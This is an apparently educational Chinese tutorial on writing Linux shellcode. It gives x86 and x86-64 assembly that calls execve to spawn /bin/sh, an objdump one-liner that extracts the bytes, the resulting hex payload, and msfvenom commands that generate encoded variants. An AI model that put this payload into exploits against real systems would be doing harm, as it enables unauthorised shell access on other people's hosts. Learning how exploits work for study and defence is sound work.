什么是shellcode

shellcode主要是一段十六进制数据，同时也是一段可执行的代码，如果想要通过漏洞拿到主机权限，那对shellcode的了解是必不可少的。linux的shellcode编写基本上只需要调用出命令行就行了，因为Linux的命令行已经能做到绝大部分事情了，除非execve系统调用被禁用（用来运行一个新进程)，导致无法运行一个新程序，那就只能通过别的办法完成了。


系统调用用来与内核交互

32为linux的部分系统调用号


“


#define __NR_restart_syscall 0

 #define __NR_exit 1

 #define __NR_fork 2

#define __NR_read 3

#define __NR_write 4

 #define __NR_open 5

#define __NR_close 6

#define __NR_waitpid 7

#define __NR_creat 8

 #define __NR_link 9

 #define __NR_unlink 10

 #define __NR_execve 11


”


可以看到execve系统调用号为11

32位linux可以通过int 0x80指令进行系统调用

64位通过syscall进行系统调用


在进行int 0x80调用中，我们需要控制四个寄存器


1

第一个eax，令它为11，以进行execve系统调用


2

第二个ebx, 需要让它为指向我们需要执行程序的字符串地址，linux命令行程序是\bin\sh,我们需要构建这个地址


3

第三个ecx, 需要指向程序参数，这里我们并不需要参数，但我们知道所有程序的第一个参数都是它本身字符串，所有更改为指向ebx（‘bin/sh地址’）的地址就行了，也可以为0


4

第四个edx, 指向环境，可以为0


接下来，我们构造完整的代码





“


xor eax,eax;  将eax赋值为0

push eax;  将 0 入栈

push "/sh"

push "/bin" ;将/bin/sh存入栈中

mov ebx,esp ；将字符串地址赋值给ebx

xor ecx,ecx; ecx置0

xor edx,edx; edx置0

mov al,0xb; 0xb就是11

int 0x80; 系统调用

下一步就是提取二进制数据

使用一个用来提取shellcode的命令

objdump -d ./shellcode|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'



从而得到\x31\xc0\x50\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80


这个就是shellcode了！！！

64位shellcode，用rdi,rsi,rdx传参数

同时execve系统为59,稍微修改下就好了


“

xor rdx, rdx

xor rsi, rsi

mov rbx,'/bin/sh'

push rbx

push rsp

pop rdi

mov al, 59

syscall


”



当然，我们没必要每次都去写shellcode

有很多工具可以供我们使用，比如metasploit,

可以提供绝大多数shellcode，并且还提供了编码器,

安装好后使用msfconsole命令就能够打开它

用show payloads命令就可以查看msf带的所有shellcode

看到有许多shellcode可供选择

我们再使用msfvenom就能生成指定的shellcode

命令为msfvenom -p payload -f 语言形式

（中间还有一些每个payload需要的参数）

比如生成我们上面编写的shellcode，只要使用

msfvenom -p linux/x86/exec CMD='/bin/sh' -f c

如果需要特定编码的shellcode

比如程序不接受\x00字符串，可以使用编码器

可以使用msfvenom --list encoders查看所有编码器

然后我们再使用

msfvenom -p linux/x86/exec CMD='/bin/sh' -e x86/alpha_upper -f c

就可以生成一份没零shellcode了



有这么多编码器使用，已经可以应付绝大多数情况了，当然，遇到一些从来没有遇到的情况，还是需要我们自己编写，所有也需要多加练习shellcode的编写，应对各种情况
